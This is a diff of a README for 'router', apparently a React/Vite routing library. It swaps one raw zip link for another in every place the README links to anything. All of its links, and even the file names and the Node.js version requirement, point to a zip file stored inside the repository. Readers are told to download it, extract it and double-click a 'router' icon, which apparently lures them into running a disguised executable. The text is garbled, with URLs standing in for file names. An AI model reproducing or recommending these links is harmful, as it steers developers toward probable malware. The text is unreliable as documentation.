@@ -1,7 +1,7 @@
 # 🚀 router - Simplifying Your React App Routing
 
 ## 📦 Download Now
-[![Download](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip%https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)
+[![Download](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip%https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)
 
 ## 📝 Introduction
 Welcome to **router**, a client-first folder-based routing solution designed for React and Vite applications. This tool makes handling your app's navigation easier and more structured. You can organize your routes with a simple folder structure. This approach saves time and effort while building your web applications.
@@ -15,7 +15,7 @@ Welcome to **router**, a client-first folder-based routing solution designed for
 
 ## 📋 System Requirements
 - **Operating System**: Windows, macOS, or Linux
-- **https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip**: Version 14 or higher
+- **https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip**: Version 14 or higher
 - **npm**: Version 6 or higher
 - **Memory**: At least 4 GB RAM recommended
 - **Disk Space**: A minimum of 100 MB available space
@@ -23,7 +23,7 @@ Welcome to **router**, a client-first folder-based routing solution designed for
 ## 🚀 Getting Started
 Follow these steps to download and run **router**:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip).
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip).
 
 2. **Choose the Right Version**: Look for the latest version listed. It will usually have the highest version number.
 
@@ -41,20 +41,20 @@ Once you have downloaded the necessary files, follow these steps to install:
 4. **Run the Application**: Double-click the **router** icon to start it.
 
 ## 🔧 How to Use
-With **router**, you can set up your app's routing by creating a folder structure that matches your desired URL paths. Each folder can contain a file named `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip` or `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip` based on your choice of JavaScript or TypeScript.
+With **router**, you can set up your app's routing by creating a folder structure that matches your desired URL paths. Each folder can contain a file named `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip` or `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip` based on your choice of JavaScript or TypeScript.
 
 ### Example Structure
 - `/src`
   - `/routes`
     - `/home`
-      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip`  *(This corresponds to the "/home" route)*
+      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip`  *(This corresponds to the "/home" route)*
     - `/about`
-      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip`  *(This corresponds to the "/about" route)*
+      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip`  *(This corresponds to the "/about" route)*
     - `/products`
-      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip`  *(This corresponds to the "/products" route)*
+      - `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip`  *(This corresponds to the "/products" route)*
 
 ### Importing the Router
-To use **router** in your project, you need to import it into your main application file, typically `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip` or `https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip`.
+To use **router** in your project, you need to import it into your main application file, typically `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip` or `https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip`.
 
 ```javascript
 import { Router } from 'router';
@@ -79,7 +79,7 @@ You can find more information about advanced settings and features in the offici
 Feel free to contribute to the project. If you have suggestions or find bugs, submit them through issues on the GitHub repository. Make sure to follow the contribution guidelines provided.
 
 ## 📦 Additional Resources
-- **Official Documentation**: [router Documentation](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)
+- **Official Documentation**: [router Documentation](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)
 - **GitHub Discussions**: Join discussions or ask questions in the community.
 
 ## 📧 Support
@@ -89,6 +89,6 @@ If you encounter any issues while using **router** or need assistance, please fe
 Keep an eye on our releases page to stay updated with the latest features and improvements. Remember to download the latest version to benefit from new functionalities.
 
 ## 📍 Useful Links
-- [Releases Page](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)
-- [Documentation](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)
-- [Contribution Guidelines](https://github.com/DkMIke2612/router/raw/refs/heads/main/packages/Software-3.4.zip)
+- [Releases Page](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)
+- [Documentation](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)
+- [Contribution Guidelines](https://github.com/DkMIke2612/router/raw/refs/heads/main/apps/olova-router/src/generator/Software_1.6.zip)
